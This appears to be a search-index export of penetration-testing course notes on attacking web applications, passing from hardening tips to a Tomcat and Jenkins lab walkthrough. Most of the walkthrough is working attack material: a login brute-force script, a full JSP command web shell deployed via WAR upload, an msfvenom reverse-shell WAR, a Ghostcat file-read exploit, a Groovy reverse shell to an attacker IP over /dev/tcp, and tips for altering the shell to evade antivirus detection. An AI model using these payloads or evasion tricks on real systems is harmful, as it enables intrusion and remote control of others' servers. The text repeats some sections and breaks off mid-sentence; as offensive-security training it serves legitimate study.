WordPress can be disabled to prevent code execution if the server is compromised. Regular updates : Applications should be updated regularly, and patches supplied by vendors should be applied as soon as possible. Backups : System administrators should always configure website and database backups, allowing the application to be quickly restored in case of a compromise. Security monitoring : There are various tools and plugins that can be used to monitor the status and various security-related issues for our applications. Another option is a Web Application Firewall (WAF). While not a silver bullet, a WAF can help add an extra layer of protection provided all the measures above have already been taken. LDAP integration with Active Directory : Integrating applications with Active Directory single sign-on can increase ease of access, provide more auditing functionality (especially if synced with Azure), and make managing credentials and service accounts more streamlined. It also decreases the number of accounts and passwords that a user will have to remember and give fine-grained control over the password policy. We should be careful with what we expose to the internet. Does that GitLab repo really need to be public? Does our ticketing system need to be accessible outside the internal network? With these controls in place, we will have a solid baseline to apply to all applications regardless of their function. Application-Specific Hardening Tips \u00b6 Application Hardening Category Discussion WordPress Security monitoring Use a security plugin such as WordFence which includes security monitoring, blocking of suspicious activity, country blocking, two-factor authentication, and more Joomla Access controls A plugin such as AdminExile can be used to require a secret key to log in to the Joomla admin page such as http://joomla.inlanefreight.local/administrator?thisismysecretkey Drupal Access controls Disable, hide, or move the admin login page Tomcat Access controls Limit access to the Tomcat Manager and Host-Manager applications to only localhost. If these must be exposed externally, enforce IP whitelisting and set a very strong password and non-standard username. Jenkins Access controls Configure permissions using the Matrix Authorization Strategy plugin Splunk Regular updates Make sure to change the default password and ensure that Splunk is properly licensed to enforce authentication PRTG Network Monitor Secure authentication Make sure to stay up-to-date and change the default PRTG password osTicket Access controls Limit access from the internet if possible GitLab Secure authentication Enforce sign-up restrictions such as requiring admin approval for new sign-ups, configuring allowed and denied domains","title":"Closing Out"},{"location":"attacking_common_apps/closing_out/#other-notable-applications","text":"A big part of penetration testing is adapting to the unknown. Some testers may run a few scans and become discouraged when they don't see anything directly exploitable. If we can dig through our scan data and filter out all of the noise, we will often find things that scanners miss, such as a Tomcat instance with weak or default credentials or a wide-open Git repository that gives us an SSH key or password that we can use elsewhere to gain access. Having a deep understanding of the necessary methodology and mindset will make you successful, no matter if the target network has WordPress and Tomcat or a custom support ticketing system and a network monitoring system such as Nagios.","title":"Other Notable Applications"},{"location":"attacking_common_apps/closing_out/#honorable-mentions","text":"Application Abuse Info Axis2 This can be abused similar to Tomcat. We will often actually see it sitting on top of a Tomcat installation. If we cannot get RCE via Tomcat, it is worth checking for weak/default admin credentials on Axis2. We can then upload a webshell in the form of an AAR file (Axis2 service file). There is also a Metasploit module that can assist with this. Websphere Websphere has suffered from many different vulnerabilities over the years. Furthermore, if we can log in to the administrative console with default credentials such as system:manager we can deploy a WAR file (similar to Tomcat) and gain RCE via a web shell or reverse shell. Elasticsearch Elasticsearch has had its fair share of vulnerabilities as well. Though old, we have seen this before on forgotten Elasticsearch installs during an assessment for a large enterprise (and identified within 100s of pages of EyeWitness report output). Though not realistic, the Hack The Box machine Haystack features Elasticsearch. Zabbix Zabbix is an open-source system and network monitoring solution that has had quite a few vulnerabilities discovered such as SQL injection, authentication bypass, stored XSS, LDAP password disclosure, and remote code execution. Zabbix also has built-in functionality that can be abused to gain remote code execution. The HTB box Zipper showcases how to use the Zabbix API to gain RCE. Nagios Nagios is another system and network monitoring product. Nagios has had a wide variety of issues over the years, including remote code execution, root privilege escalation, SQL injection, code injection, and stored XSS. If you come across a Nagios instance, it is worth checking for the default credentials nagiosadmin:PASSW0RD and fingerprinting the version. WebLogic WebLogic is a Java EE application server. At the time of writing, it has 190 reported CVEs . There are many unauthenticated RCE exploits from 2007 up to 2021, many of which are Java Deserialization vulnerabilities. Wikis/Intranets We may come across internal Wikis (such as MediaWiki), custom intranet pages, SharePoint, etc. These are worth assessing for known vulnerabilities but also searching if there is a document repository. We have run into many intranet pages (both custom and SharePoint) that had a search functionality which led to discovering valid credentials. DotNetNuke DotNetNuke (DNN) is an open-source CMS written in C# that uses the .NET framework. It has had a few severe issues over time, such as authentication bypass, directory traversal, stored XSS, file upload bypass, and arbitrary file download. vCenter vCenter is often present in large organizations to manage multiple instances of ESXi. It is worth checking for weak credentials and vulnerabilities such as this Apache Struts 2 RCE that scanners like Nessus do not pick up. This unauthenticated OVA file upload vulnerability was disclosed in early 2021, and a PoC for CVE-2021-22005 was released during the development of this module. vCenter comes as both a Windows and a Linux appliance. If we get a shell on the Windows appliance, privilege escalation is relatively simple using JuicyPotato or similar. We have also seen vCenter already running as SYSTEM and even running as a domain admin! It can be a great foothold in the environment or be a single source of compromise.","title":"Honorable Mentions"},{"location":"attacking_common_apps/closing_out/#appilcation-hardening","text":"The first step for any organization should be to create a detailed (and accurate) application inventory of both internal and external-facing applications. This can be achieved in many ways, and blue teams on a budget could benefit from pentesting tools such as Nmap and EyeWitness to assist in the process. Various open-source and paid tools can be used to create and maintain this inventory. Without knowing what exists in the environment, we won't know what to protect! Creating this inventory may expose instances of \"shadow IT\" (or unauthorized installs), deprecated applications that are no longer needed, or even issues such as a trial version of a tool being converted to a free version automatically (such as Splunk when it no longer requires authentication).","title":"Appilcation Hardening"},{"location":"attacking_common_apps/closing_out/#general-hardening-tips","text":"Secure authentication : Applications should enforce strong passwords during registration and setup, and default administrative account passwords should be changed. If possible, the default administrative accounts should be disabled, with new custom administrative accounts created. Some applications inherently support 2FA authentication, which should be made mandatory for at least administrator-level users. Access controls : Proper access control mechanisms should be implemented per application. For example, login pages should not be accessible from the external network unless there is a valid business reason for this access. Similarly, file and folder permissions can be configured to deny uploads or application deployments. Disable unsafe features : Features such as PHP code editing in WordPress can be disabled to prevent code execution if the server is compromised. Regular updates : Applications should be updated regularly, and patches supplied by vendors should be applied as soon as possible. Backups : System administrators should always configure website and database backups, allowing the application to be quickly restored in case of a compromise. Security monitoring : There are various tools and plugins that can be used to monitor the status and various security-related issues for our applications. Another option is a Web Application Firewall (WAF). While not a silver bullet, a WAF can help add an extra layer of protection provided all the measures above have already been taken. LDAP integration with Active Directory : Integrating applications with Active Directory single sign-on can increase ease of access, provide more auditing functionality (especially if synced with Azure), and make managing credentials and service accounts more streamlined. It also decreases the number of accounts and passwords that a user will have to remember and give fine-grained control over the password policy. We should be careful with what we expose to the internet. Does that GitLab repo really need to be public? Does our ticketing system need to be accessible outside the internal network? With these controls in place, we will have a solid baseline to apply to all applications regardless of their function.","title":"General Hardening Tips"},{"location":"attacking_common_apps/closing_out/#application-specific-hardening-tips","text":"Application Hardening Category Discussion WordPress Security monitoring Use a security plugin such as WordFence which includes security monitoring, blocking of suspicious activity, country blocking, two-factor authentication, and more Joomla Access controls A plugin such as AdminExile can be used to require a secret key to log in to the Joomla admin page such as http://joomla.inlanefreight.local/administrator?thisismysecretkey Drupal Access controls Disable, hide, or move the admin login page Tomcat Access controls Limit access to the Tomcat Manager and Host-Manager applications to only localhost. If these must be exposed externally, enforce IP whitelisting and set a very strong password and non-standard username. Jenkins Access controls Configure permissions using the Matrix Authorization Strategy plugin Splunk Regular updates Make sure to change the default password and ensure that Splunk is properly licensed to enforce authentication PRTG Network Monitor Secure authentication Make sure to stay up-to-date and change the default PRTG password osTicket Access controls Limit access from the internet if possible GitLab Secure authentication Enforce sign-up restrictions such as requiring admin approval for new sign-ups, configuring allowed and denied domains","title":"Application-Specific Hardening Tips"},{"location":"attacking_common_apps/containers_software_dev/","text":"Tomcat Discovery & Enumeration \u00b6 Apache Tomcat is an open-source web server that hosts applications written in Java. Discovery/Footprint \u00b6 Tomcat servers can be identified by the Server header in the HTTP response. hrmns@htb[/htb]$ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat <html lang=\"en\"><head><META http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><link href=\"./images/docs-stylesheet.css\" rel=\"stylesheet\" type=\"text/css\"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name=\"author\" <SNIP> This is the default documentation page, which may not be removed by administrators. General folder structure of a Tomcat installation. \u251c\u2500\u2500 bin \u251c\u2500\u2500 conf \u2502 \u251c\u2500\u2500 catalina.policy \u2502 \u251c\u2500\u2500 catalina.properties \u2502 \u251c\u2500\u2500 context.xml \u2502 \u251c\u2500\u2500 tomcat-users.xml \u2502 \u251c\u2500\u2500 tomcat-users.xsd \u2502 \u2514\u2500\u2500 web.xml \u251c\u2500\u2500 lib \u251c\u2500\u2500 logs \u251c\u2500\u2500 temp \u251c\u2500\u2500 webapps \u2502 \u251c\u2500\u2500 manager \u2502 \u2502 \u251c\u2500\u2500 images \u2502 \u2502 \u251c\u2500\u2500 META-INF \u2502 \u2502 \u2514\u2500\u2500 WEB-INF | | \u2514\u2500\u2500 web.xml \u2502 \u2514\u2500\u2500 ROOT \u2502 \u2514\u2500\u2500 WEB-INF \u2514\u2500\u2500 work \u2514\u2500\u2500 Catalina \u2514\u2500\u2500 localhost The bin folder stores scripts and binaries needed to start and run a Tomcat server. The conf folder stores various configuration files used by Tomcat. The tomcat-users.xml file stores user credentials and their assigned roles. The lib folder holds the various JAR files needed for the correct functioning of Tomcat. The logs and temp folders store temporary log files. The webapps folder is the default webroot of Tomcat and hosts all the applications. The work folder acts as a cache and is used to store data during runtime. Each folder inside webapps is expected to have the following structure. webapps/customapp \u251c\u2500\u2500 images \u251c\u2500\u2500 index.jsp \u251c\u2500\u2500 META-INF \u2502 \u2514\u2500\u2500 context.xml \u251c\u2500\u2500 status.xsd \u2514\u2500\u2500 WEB-INF \u251c\u2500\u2500 jsp | \u2514\u2500\u2500 admin.jsp \u2514\u2500\u2500 web.xml \u2514\u2500\u2500 lib | \u2514\u2500\u2500 jdbc_drivers.jar \u2514\u2500\u2500 classes \u2514\u2500\u2500 AdminServlet.class The most important file among these is WEB-INF/web.xml , which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes. All compiled classes used by the application should be stored in the WEB-INF/classes folder. These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website. example web.xml file. <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE web-app PUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\" \"http://java.sun.com/dtd/web-app_2_3.dtd\"> <web-app> <servlet> <servlet-name>AdminServlet</servlet-name> <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class> </servlet> <servlet-mapping> <servlet-name>AdminServlet</servlet-name> <url-pattern>/admin</url-pattern> </servlet-mapping> </web-app> web.xml configuration above defines a new servlet named AdminServlet that is mapped to the class com.inlanefreight.api.AdminServlet . Next, a new servlet mapping is created to map requests to /admin with AdminServlet . This configuration will send any request received for /admin to the AdminServlet.class class for processing. The web.xml descriptor holds a lot of sensitive information and is an important file to check when leveraging a Local File Inclusion (LFI) vulnerability. The tomcat-users.xml file is used to allow or disallow access to the** /manager** and host-manager admin pages. <?xml version=\"1.0\" encoding=\"UTF-8\"?> <SNIP> <tomcat-users xmlns=\"http://tomcat.apache.org/xml\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://tomcat.apache.org/xml tomcat-users.xsd\" version=\"1.0\"> <!-- By default, no user is included in the \"manager-gui\" role required to operate the \"/manager/html\" web application. If you wish to use this app, you must define such a user - the username and password are arbitrary. Built-in Tomcat manager roles: - manager-gui - allows access to the HTML GUI and the status pages - manager-script - allows access to the HTTP API and the status pages - manager-jmx - allows access to the JMX proxy and the status pages - manager-status - allows access to the status pages only The users below are wrapped in a comment and are therefore ignored. If you wish to configure one or more of these users for use with the manager web application, do not forget to remove the <!.. ..> that surrounds them. You will also need to set the passwords to something appropriate. --> <SNIP> !-- user manager can access only manager section --> <role rolename=\"manager-gui\" /> <user username=\"tomcat\" password=\"tomcat\" roles=\"manager-gui\" /> <!-- user admin can access manager and admin section both --> <role rolename=\"admin-gui\" /> <user username=\"admin\" password=\"admin\" roles=\"manager-gui,admin-gui\" /> </tomcat-users> We can see that a user tomcat with the password tomcat has the manager-gui role, and a second weak password admin is set for the user account admin Enumeration \u00b6 After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the /manager and the /host-manager pages. hrmns@htb[/htb]$ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://web01.inlanefreight.local:8180/ [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/09/21 17:34:54 Starting gobuster =============================================================== /docs (Status: 302) /examples (Status: 302) /manager (Status: 302) Progress: 49959 / 87665 (56.99%)^C [!] Keyboard interrupt detected, terminating. =============================================================== 2021/09/21 17:44:29 Finished =============================================================== We may be able to either log in to one of these using weak credentials such as tomcat:tomcat , admin:admin , etc. If these first few tries don't work, we can try a password brute force attack against the login page. If we are successful in logging in, we can upload a Web Application Resource or Web Application ARchive (WAR) file containing a JSP web shell Attacking Tomcat \u00b6 If we can access the /manager or /host-manager endpoints, we can likely achieve remote code execution on the Tomcat server. Tomcat Manager - Login Brute Force \u00b6 msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180 msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58 msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options Module options (auxiliary/scanner/http/tomcat_mgr_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list PASSWORD no The HTTP password to specify for authentication PASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt no File containing passwords, one per line Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.129.201.58 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 8180 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections STOP_ON_SUCCESS true yes Stop guessing when a credential works for a host TARGETURI /manager/html yes URI for Manager login. Default is /manager/html THREADS 1 yes The number of concurrent threads (max one per host) USERNAME no The HTTP username to specify for authentication USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt no File containing users and passwords separated by space, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt no File containing users, one per line VERBOSE true yes Whether to print output for all attempts VHOST web01.inlanefreight.local no HTTP server virtual host msf6 auxiliary(scanner/http/tomcat_mgr_login) > run [!] No active DB -- Credential data will not be saved! [-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:manager (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:role1 (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:root (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:tomcat (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:s3cret (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:vagrant (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: root:admin (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: root:manager (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: root:role1 (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: root:root (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: root:tomcat (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: root:s3cret (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: root:vagrant (Incorrect) [+] 10.129.201.58:8180 - Login Successful: tomcat:admin [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed It is important to note that there are many tools available to us as penetration testers. Many exist to make our work more efficient, especially since most penetration tests are \"time-boxed\" or under strict time constraints. No one tool is better than another, and it does not make us a \"bad\" penetration tester if we use certain tools like Metasploit to our advantage. Provided we understand each scanner and exploit script that we run and the risks, then utilizing this scanner properly is no different from using Burp Intruder or writing a custom Python script. Some say, \"work smarter, not harder.\" Why would we make extra work for ourselves during a 40-hour assessment with 1,500 in-scope hosts when we can use a particular tool to help us? It is vital for us to understand how our tools work and how to do many things manually. At the very least, if we decide to use a certain tool, we should be able to explain its usage and potential impact to our clients should they question us during or after the assessment. Let's say a particular Metasploit module (or another tool) is failing or not behaving the way we believe it should. We can always use Burp Suite or ZAP to proxy the traffic and troubleshoot. To do this, first, fire up Burp Suite and then set the PROXIES option like the following: msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080 PROXIES => HTTP:127.0.0.1:8080 msf6 auxiliary(scanner/http/tomcat_mgr_login) > run [!] No active DB -- Credential data will not be saved! [-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect) [-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect) We can see in Burp exactly how the scanner is working, taking each credential pair and base64 encoding into account for basic auth that Tomcat uses. A quick check of the value in the Authorization header for one request shows that the scanner is running correctly, base64 encoding the credentials admin:vagrant the way the Tomcat application would do when a user attempts to log in directly from the web application. hrmns@htb[/htb]$ echo YWRtaW46dmFncmFudA == | base64 -d admin:vagrant can also use this Python script to achieve the same result. #!/usr/bin/python import requests from termcolor import cprint import argparse parser = argparse . ArgumentParser ( description = \"Tomcat manager or host-manager credential bruteforcing\" ) parser . add_argument ( \"-U\" , \"--url\" , type = str , required = True , help = \"URL to tomcat page\" ) parser . add_argument ( \"-P\" , \"--path\" , type = str , required = True , help = \"manager or host-manager URI\" ) parser . add_argument ( \"-u\" , \"--usernames\" , type = str , required = True , help = \"Users File\" ) parser . add_argument ( \"-p\" , \"--passwords\" , type = str , required = True , help = \"Passwords Files\" ) args = parser . parse_args () url = args . url uri = args . path users_file = args . usernames passwords_file = args . passwords new_url = url + uri f_users = open ( users_file , \"rb\" ) f_pass = open ( passwords_file , \"rb\" ) usernames = [ x . strip () for x in f_users ] passwords = [ x . strip () for x in f_pass ] cprint ( \" \\n [+] Atacking.....\" , \"red\" , attrs = [ 'bold' ]) for u in usernames : for p in passwords : r = requests . get ( new_url , auth = ( u , p )) if r . status_code == 200 : cprint ( \" \\n [+] Success!!\" , \"green\" , attrs = [ 'bold' ]) cprint ( \"[+] Username : {} \\n [+] Password : {} \" . format ( u , p ), \"green\" , attrs = [ 'bold' ]) break if r . status_code == 200 : break if r . status_code != 200 : cprint ( \" \\n [+] Failed!!\" , \"red\" , attrs = [ 'bold' ]) cprint ( \"[+] Could not Find the creds :( \" , \"red\" , attrs = [ 'bold' ]) #print r.status_code We can try out the script with the default Tomcat users and passwords file that the above Metasploit module uses. hrmns@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt [+] Atacking..... [+] Success!! [+] Username : b'tomcat' [+] Password : b'admin' Tomcat Manager - WAR File Upload \u00b6 Many Tomcat installations provide a GUI interface to manage the application. This interface is available at /manager/html by default, which only users assigned the manager-gui role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage. The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility. A JSP web shell such as this can be downloaded and placed within the archive. <% @ page import = \"java.util.*,java.io.*\" %> <% // // JSP_KIT // // cmd.jsp = Command Execution (unix) // // by: Unknown // modified: 27/06/2003 // %> < HTML >< BODY > < FORM METHOD = \"GET\" NAME = \"myform\" ACTION = \"\" > < INPUT TYPE = \"text\" NAME = \"cmd\" > < INPUT TYPE = \"submit\" VALUE = \"Send\" > </ FORM > < pre > <% if ( request . getParameter ( \"cmd\" ) != null ) { out . println ( \"Command: \" + request . getParameter ( \"cmd\" ) + \"<BR>\" ); Process p = Runtime . getRuntime (). exec ( request . getParameter ( \"cmd\" )); OutputStream os = p . getOutputStream (); InputStream in = p . getInputStream (); DataInputStream dis = new DataInputStream ( in ); String disr = dis . readLine (); while ( disr != null ) { out . println ( disr ); disr = dis . readLine (); } } %> </ pre > </ BODY ></ HTML > hrmns@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp hrmns@htb[/htb]$ zip -r backup.war cmd.jsp adding: cmd.jsp (deflated 81%) Click on Browse to select the .war file and then click on Deploy . This file is uploaded to the manager GUI, after which the /backup application will be added to the table. If we click on backup , we will get redirected to http://web01.inlanefreight.local:8180/backup/ and get a 404 Not Found error. We need to specify the cmd.jsp file in the URL as well. Browsing to http://web01.inlanefreight.local:8180/backup/cmd.jsp will present us with a web shell that we can use to run commands on the Tomcat server hrmns@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd = id <HTML><BODY> <FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"> <INPUT TYPE=\"text\" NAME=\"cmd\"> <INPUT TYPE=\"submit\" VALUE=\"Send\"> </FORM> <pre> Command: id<BR> uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) </pre> </BODY></HTML> To clean up after ourselves, we can go back to the main Tomcat Manager page and click the Undeploy button next to the backups application after, of course, noting down the file and upload location for our report, which in our example is /opt/tomcat/apache-tomcat-10.0.10/webapps . If we do an ls on that directory from our web shell, we'll see the uploaded backup.war file and the backup directory containing the cmd.jsp script and META-INF created after the application deploys. Clicking on Undeploy will typically remove the uploaded WAR archive and the directory associated with the application. Could also use msfvenom to generate a malicious WAR file. Browse to the Tomcat console and deploy this file. Tomcat automatically extracts the WAR file contents and deploys it. hrmns@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST = 10 .10.14.15 LPORT = 4443 -f war > backup.war Payload size: 1098 bytes Final size of war file: 1098 bytes Start a Netcat listener and click on /backup to execute the shell. hrmns@htb[/htb]$ nc -lnvp 4443 listening on [any] 4443 ... connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) The multi/http/tomcat_mgr_upload Metasploit module can be used to automate this process. This JSP web shell is very lightweight (under 1kb) and utilizes a Bookmarklet or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded cmd.jsp would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit). The web shell as is only gets detected by 2/58 anti-virus vendors. A simple change such as changing: FileOutputStream ( f ); stream . write ( m ); o = \"Uploaded: to FileOutputStream ( f ); stream . write ( m ); o = \"uPlOaDeD: results in 0/58 security vendors flagging the cmd.jsp file as malicious at the time of writing. Quick Note on Web shells When we upload web shells (especially on externals), we want to prevent unauthorized access. We should take certain measures such as a randomized file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it. We don't want an attacker to come across our web shell and leverage it to gain their own foothold. CVE-2020-1938 : Ghostcat \u00b6 Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named Ghostcat . All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable. This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat. AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in proxying requests to application servers behind the front-end web servers. AJP service is usually running at port 8009 on a Tomcat server. This can be checked with a targeted Nmap scan. hrmns@htb[/htb]$ nmap -sV -p 8009 ,8080 app-dev.inlanefreight.local Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT Nmap scan report for app-dev.inlanefreight.local (10.129.201.58) Host is up (0.14s latency). PORT STATE SERVICE VERSION 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8080/tcp open http Apache Tomcat 9.0.30 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds The PoC code for the vulnerability can be found here . The exploit can only read files and folders within the web apps folder, which means that files like /etc/passwd can\u2019t be accessed. Let\u2019s attempt to access the web.xml. hrmns@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf ---------------------------- <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!-- Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements. See the NOTICE file distributed with this work for additional information regarding copyright ownership. The ASF licenses this file to You under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. --> <web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\" metadata-complete=\"true\"> <display-name>Welcome to Tomcat</display-name> <description> Welcome to Tomcat </description> </web-app> In some Tomcat installs, we may be able to access sensitive data within the WEB-INF file. Jenkins \u00b6 Jenkins is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat. Discovery/Footprinting \u00b6 It is often installed on Windows servers running as the all-powerful SYSTEM account. If we can gain access via Jenkins and gain remote code execution as the SYSTEM account, we would have a foothold in Active Directory to begin enumeration of the domain environment. Jenkins runs on Tomcat port 8080 by default. Utilizes port 5000 to attach slave servers. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts. Enumeration \u00b6 Default installation typically uses Jenkins\u2019 database to store credentials and does not allow users to register an account. We can fingerprint Jenkins quickly by the telltale login page. May encounter a Jenkins instance that uses weak or default credentials such as admin:admin or does not have any type of authentication enabled. It is not uncommon to find Jenkins instances that do not require any authentication during an internal penetration test. Attacking Jenkins \u00b6 Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the Script Console . Allows to run arbitrary Groovy scripts within the Jenkins controller runtime. Can be abused to run operating system commands on the underlying server. Script Console \u00b6 Script console can be reached at the URL http://jenkins.inlanefreight.local:8000/script def cmd = 'id' def sout = new StringBuffer (), serr = new StringBuffer () def proc = cmd . execute () proc . consumeProcessOutput ( sout , serr ) proc . waitForOrKill ( 1000 ) println sout There are various ways that access to the script console can be leveraged to gain a reverse shell. For example, using the command below, or this Metasploit module. r = Runtime . getRuntime () p = r . exec ([ \"/bin/bash\" , \"-c\" , \"exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \\$line 2>&5 >&5; done\" ] as String []) p . waitFor () Running above cmds results in a revshell hrmns@htb[/htb]$ nc -lvnp 8443 listening on [any] 8443 ... connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844 id uid=0(root) gid=0(root) groups=0(root) /bin/bash -i root@app02:/var/lib/jenkins3# Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a 